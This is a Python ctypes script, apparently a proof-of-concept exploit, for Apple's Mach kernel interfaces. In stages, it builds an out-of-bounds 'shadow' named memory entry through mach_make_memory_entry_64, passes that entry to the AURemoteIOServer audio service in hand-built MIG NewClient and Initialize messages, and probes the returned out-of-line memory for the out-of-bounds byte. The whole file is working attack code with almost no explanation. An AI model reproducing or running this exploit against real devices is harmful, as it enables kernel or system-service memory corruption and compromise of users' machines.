import ctypes as C, struct

L = C.CDLL('/usr/lib/libSystem.B.dylib')
L.mach_task_self.restype = C.c_uint32
t = L.mach_task_self()

# === Stage 1: Shadow named entry via Surface 4 OOB ===
M = L.mach_make_memory_entry_64
M.argtypes = [C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_int, C.POINTER(C.c_uint32), C.c_uint32]
V = L.mach_vm_map
V.argtypes = [C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_uint64, C.c_int, C.c_uint32, C.c_uint64, C.c_int, C.c_int, C.c_int, C.c_int]
L.mach_vm_allocate.argtypes = [C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_int]

a = C.c_uint64(0)
kr = L.mach_vm_allocate(t, C.byref(a), 0x4000, 1)
print(f"alloc kr={kr} va={hex(a.value)}")
if kr != 0: print("BAIL: alloc"); raise SystemExit(1)

p = C.c_uint32(0); ps = C.c_uint64(0x4000)
kr = M(t, C.byref(ps), a.value, 3, C.byref(p), 0)
print(f"parent_ne kr={kr} p={p.value}")
if kr != 0: print("BAIL: parent ne"); raise SystemExit(1)

c = C.c_uint32(0); cs = C.c_uint64(0x1001)
kr = M(t, C.byref(cs), 0x1000, 3, C.byref(c), p.value)
print(f"child_ne kr={kr} c={c.value} sz={hex(cs.value)}")
if kr != 0: print("BAIL: child ne"); raise SystemExit(1)

m = C.c_uint64(0)
kr = V(t, C.byref(m), 0x4000, 0, 1, c.value, 0, 0, 3, 3, 0)
print(f"map_child kr={kr} va={hex(m.value)}")
if kr != 0: print("BAIL: map"); raise SystemExit(1)

q = (C.c_uint8 * 0x4000).from_address(m.value)
q[0x3000] = 0xAB

ne = C.c_uint32(0); ns = C.c_uint64(0x1000)
kr = M(t, C.byref(ns), m.value + 0x3000, 3, C.byref(ne), 0)
print(f"shadow_ne kr={kr} ne={ne.value}")
if kr != 0: print("BAIL: shadow ne"); raise SystemExit(1)

m4 = C.c_uint64(0)
kr = V(t, C.byref(m4), 0x4000, 0, 1, ne.value, 0, 0, 3, 3, 0)
shadow_va = m4.value
print(f"shadow_va={hex(shadow_va)} ne={ne.value} kr={kr}")
if kr != 0: print("BAIL: shadow map"); raise SystemExit(1)

# === Stage 2: Lookup AURemoteIOServer MIG port ===
L.task_get_bootstrap_port.argtypes = [C.c_uint32, C.POINTER(C.c_uint32)]
L.task_get_bootstrap_port.restype = C.c_int32
L.bootstrap_look_up.argtypes = [C.c_uint32, C.c_char_p, C.POINTER(C.c_uint32)]
L.bootstrap_look_up.restype = C.c_int32
L.mach_reply_port.restype = C.c_uint32
L.mach_msg.restype = C.c_int32
L.mach_msg.argtypes = [C.c_void_p, C.c_uint32, C.c_uint32, C.c_uint32,
                        C.c_uint32, C.c_uint32, C.c_uint32]

bs = C.c_uint32(0)
L.task_get_bootstrap_port(t, C.byref(bs))
svc = C.c_uint32(0)
kr = L.bootstrap_look_up(bs.value, b"com.apple.audio.AURemoteIOServer", C.byref(svc))
print(f"svc_lookup kr={kr} port={svc.value}")
if kr != 0 or svc.value == 0: print("BAIL: lookup"); raise SystemExit(1)

rp = L.mach_reply_port()
print(f"reply_port={rp}")

SEND = 1; RCV = 2
COMPLEX = 0x80000000
# msgh_bits = (local<<8)|remote: remote=COPY_SEND(0x13), local=MAKE_SEND_ONCE(0x14)
SO_BITS = (0x14 << 8) | 0x13    # 0x1413 — non-complex
CS_BITS = COMPLEX | SO_BITS      # 0x80001413 — complex

# === Stage 3: NewClient (msg_id 0x157c1) ===
# Layout confirmed from __XNewClient disasm:
#   [0x00..0x17] header (complex, size=0x3c, id=0x157c1)
#   [0x18..0x1b] descriptor_count = 1
#   [0x1c..0x27] port_descriptor: name=shadow_ne, disp=17(MOVE_SEND), type=0(PORT)
#   [0x28..0x2f] 8 unused inline bytes
#   [0x30..0x33] w2 arg
#   [0x34..0x37] w3 arg (client_type; 5=tap needs entitlement, use 0)
#   [0x38..0x3b] w4 arg (passed to AQMESession as uint)
# Trailer check: [0x3c]=trailer_type==0, [0x40]=trailer_size>0x1f (kernel sets these)
buf = bytearray(0x200)   # unified send+receive buffer
struct.pack_into('<IIIIII', buf, 0x00,
    CS_BITS, 0x3c, svc.value, rp, 0, 0x157c1)
struct.pack_into('<I', buf, 0x18, 1)
# port descriptor: name(4)+pad1(4)+pad2(2)+disposition(1)+type(1) = 12 bytes
struct.pack_into('<IIHBB', buf, 0x1c,
    ne.value, 0, 0, 17, 0)   # MOVE_SEND our shadow ne

buf_c = (C.c_uint8 * len(buf)).from_buffer(buf)
kr = L.mach_msg(buf_c, SEND | RCV, 0x3c, len(buf), rp, 0, 0)
print(f"NewClient mach_msg kr={kr:#010x}")
if kr != 0: print("BAIL: NewClient mach_msg"); raise SystemExit(1)

nc_bits = struct.unpack_from('<I', buf, 0)[0]
nc_size = struct.unpack_from('<I', buf, 4)[0]
nc_ret  = struct.unpack_from('<i', buf, 0x20)[0]
nc_hndl = struct.unpack_from('<I', buf, 0x24)[0]
print(f"  reply: bits={nc_bits:#x} size={nc_size} ret={nc_ret:#010x} handle={nc_hndl:#x}")
if nc_ret != 0: print("BAIL: NewClient server error"); raise SystemExit(1)

# === Stage 4: Initialize (msg_id 0x157c3) ===
# Layout confirmed from __XInitialize disasm:
#   [0x00..0x17] header (NOT complex, size=0x78, id=0x157c3)
#   [0x18..0x1f] NDR record (zeros)
#   [0x20..0x23] w23 = session_handle (from NewClient reply[0x24])
#   [0x24..0x27] w25 = play_state (0)
#   [0x28..0x4f] ASBD input  (40 bytes)
#   [0x50..0x77] ASBD output (40 bytes)
# AudioStreamBasicDescription: double mSampleRate + 8x uint32
ASBD = struct.pack('<dIIIIIIII',
    44100.0,        # mSampleRate
    0x6C70636D,     # mFormatID = 'lpcm'
    0x2C,           # mFormatFlags = isFloat(4)|isPacked(8)|isNonInterleaved(32)
    4,              # mBytesPerPacket
    1,              # mFramesPerPacket
    4,              # mBytesPerFrame
    1,              # mChannelsPerFrame
    32,             # mBitsPerChannel
    0,              # mReserved
)
assert len(ASBD) == 40

buf2 = bytearray(0x200)
struct.pack_into('<IIIIII', buf2, 0x00,
    SO_BITS, 0x78, svc.value, rp, 0, 0x157c3)
struct.pack_into('<I', buf2, 0x20, nc_hndl)  # session_handle -> w23
buf2[0x28:0x50] = ASBD
buf2[0x50:0x78] = ASBD

buf2_c = (C.c_uint8 * len(buf2)).from_buffer(buf2)
kr = L.mach_msg(buf2_c, SEND | RCV, 0x78, len(buf2), rp, 0, 0)
print(f"Initialize mach_msg kr={kr:#010x}")
if kr != 0: print("BAIL: Initialize mach_msg"); raise SystemExit(1)

in_bits  = struct.unpack_from('<I', buf2, 0)[0]
in_size  = struct.unpack_from('<I', buf2, 4)[0]
in_dcnt  = struct.unpack_from('<I', buf2, 0x18)[0]
is_cmplx = bool(in_bits & COMPLEX)
print(f"  reply: bits={in_bits:#x} size={in_size} complex={is_cmplx} descs={in_dcnt}")

if not is_cmplx:
    in_ret = struct.unpack_from('<i', buf2, 0x20)[0]
    print(f"  non-complex (failure) ret={in_ret:#010x}")
    raise SystemExit(1)

# === Stage 5: Parse OOL descriptors ===
# 64-bit OOL descriptor (16 bytes):
#   [0..7]  address  (uint64) — kernel fills with our task's mapped VA on receive
#   [8..11] {deallocate(1),copy(1),pad(1),type(1)} little-endian
#   [12..15] size (uint32)
# Expected: 3 descriptors, each PHYSICAL_COPY, deallocate=1
for i in range(in_dcnt):
    off   = 0x1c + i * 16
    addr  = struct.unpack_from('<Q', buf2, off)[0]
    flags = struct.unpack_from('<I', buf2, off + 8)[0]
    sz    = struct.unpack_from('<I', buf2, off + 12)[0]
    dealloc  = flags & 0xFF
    copy_op  = (flags >> 8) & 0xFF
    dtype    = (flags >> 24) & 0xFF
    print(f"  OOL[{i}]: addr={hex(addr)} sz={hex(sz)} dealloc={dealloc} copy={copy_op} type={dtype}")
    if addr and sz:
        view = (C.c_uint8 * min(64, sz)).from_address(addr)
        print(f"    data: {bytes(view).hex()}")
        diff = addr - shadow_va
        print(f"    addr - shadow_va({hex(shadow_va)}) = {diff:#x}")
        # probe for OOB: read at shadow_va + 0x3000 (our OOB byte)
        oob_byte = (C.c_uint8 * 1).from_address(shadow_va + 0x3000)[0]
        print(f"    shadow_va[0x3000] = {hex(oob_byte)} (wrote 0xAB, should be 0xAB)")

print("DONE")
